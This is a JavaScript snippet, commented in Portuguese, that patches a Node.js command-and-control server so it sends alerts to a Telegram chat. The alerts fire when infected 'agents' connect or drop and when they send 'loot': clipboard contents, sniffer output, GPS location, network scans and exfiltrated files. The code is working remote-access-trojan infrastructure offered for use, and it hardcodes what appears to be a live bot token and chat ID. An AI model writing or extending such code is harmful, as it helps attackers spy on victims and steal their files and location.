// --- Adicione no topo do seu server.js, junto com os outros 'require' ---
const TelegramBot = require('node-telegram-bot-api');

// --- Configurações do Telegram (MUDE AQUI!) ---
const TELEGRAM_BOT_TOKEN = '7013465399:AAGJKHnWPnzVJjJEs4rty936dtm3Vm123yQ'; // Pega no @BotFather
const TELEGRAM_CHAT_ID = '-1002186646587';       // Pega no @userinfobot

const telegramBot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });

// Função pra enviar mensagem pro Telegram
const sendTelegramMessage = (message) => {
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        telegramBot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'HTML' })
            .catch(e => console.error('[TELEGRAM_ERROR] Falha ao enviar mensagem:', e.message));
    }
};

// --- Modificações no seu código existente ---

// 1. No evento 'identify' quando um agente conecta:
// Substitua: console.log(`[+] AGENT ONLINE: ${id} (${agents.get(id).ip})`);
// Por:
        if (type === 'agent') {
            agents.set(id, { 
                socketId: socket.id, 
                lastSeen: new Date().toISOString(), 
                ip: ip || socket.handshake.address, 
                os: os || 'Unknown', 
                capabilities: ['gps', 'clipboard', 'exec', 'file_read', 'file_write'] 
            });
            const agentInfo = agents.get(id);
            const connectMsg = `🔥 **NOVO AGENTE ONLINE!** 🔥\nID: <b>${id}</b>\nIP: <b>${agentInfo.ip}</b>\nOS: <b>${agentInfo.os}</b>`;
            console.log(`[+] AGENT ONLINE: ${id} (${agentInfo.ip})`);
            io.emit('log', `[SYSTEM] NEW NODE DETECTED: ${id} (${agentInfo.ip})`);
            io.emit('agents_update', Array.from(agents.values()).map(a => ({ id: Array.from(agents.keys()).find(key => agents.get(key).socketId === a.socketId), ...a })));
            sendTelegramMessage(connectMsg); // <-- AQUI! Notifica no Telegram
        } else {
            console.log('[+] COMMANDER UI CONNECTED');
            socket.emit('agents_update', Array.from(agents.values()).map(a => ({ id: Array.from(agents.keys()).find(key => agents.get(key).socketId === a.socketId), ...a })));
            socket.emit('loot_update_initial', loot);
            sendTelegramMessage('💻 **Commander UI Conectada!**'); // <-- AQUI! Notifica no Telegram
        }

// 2. No evento 'stream_log' quando houver loot:
// Substitua: io.emit('loot_update', newLootItem);
// Por:
        if (output.includes('[DATA_START]') || output.includes('[SNIFFER]') || type === 'CLIPBOARD_DATA' || type === 'NMAP_SCAN' || type === 'GPS_DATA') {
             const newLootItem = {
                 time: timestamp,
                 agentId: from,
                 type: type || 'GENERIC_LOOT',
                 data: output
             };
             loot.unshift(newLootItem);
             saveLoot();
             io.emit('loot_update', newLootItem);
             // <-- AQUI! Notifica loot importante no Telegram
             const lootMsg = `💰 **NOVO LOOT!** 💰\nAgente: <b>${from}</b>\nTipo: <b>${type || 'GENERIC_LOOT'}</b>\nDados: <code>${String(output).substring(0, 200)}...</code>`;
             sendTelegramMessage(lootMsg);
        }
        io.emit('log', `[${from}] ${output}`);

// 3. No evento 'file_content_from_agent' quando um arquivo é exfiltrado:
// Substitua: io.emit('loot_update', newLootItem);
// Por:
        const timestamp = new Date().toISOString();
        const newLootItem = {
            time: timestamp,
            agentId: from,
            type: 'FILE_EXFIL',
            filename: filename,
            data: b64content
        };
        loot.unshift(newLootItem);
        saveLoot();
        io.emit('loot_update', newLootItem);
        // <-- AQUI! Notifica arquivo exfiltrado no Telegram
        const fileExfilMsg = `💾 **ARQUIVO EXFILTRADO!** 💾\nAgente: <b>${from}</b>\nArquivo: <b>${filename}</b>\nTamanho: <b>${(b64content.length / 1024).toFixed(2)} KB</b>`;
        sendTelegramMessage(fileExfilMsg);
        io.emit('log', `[FILE EXFIL from ${from}] ${filename} (${b64content.length} bytes base64)`);

// 4. No evento 'disconnect' quando um agente cai:
// Substitua: console.log(`[-] AGENT OFFLINE: ${disconnectedAgentId}`);
// Por:
       if (disconnectedAgentId) {
           console.log(`[-] AGENT OFFLINE: ${disconnectedAgentId}`);
           io.emit('log', `[SYSTEM] NODE OFFLINE: ${disconnectedAgentId}`);
           io.emit('agents_update', Array.from(agents.values()).map(a => ({ id: Array.from(agents.keys()).find(key => agents.get(key).socketId === a.socketId), ...a })));
           sendTelegramMessage(`💔 **AGENTE OFFLINE:** <b>${disconnectedAgentId}</b>`); // <-- AQUI! Notifica no Telegram
       } else {
           console.log('[-] COMMANDER UI DISCONNECTED');
       }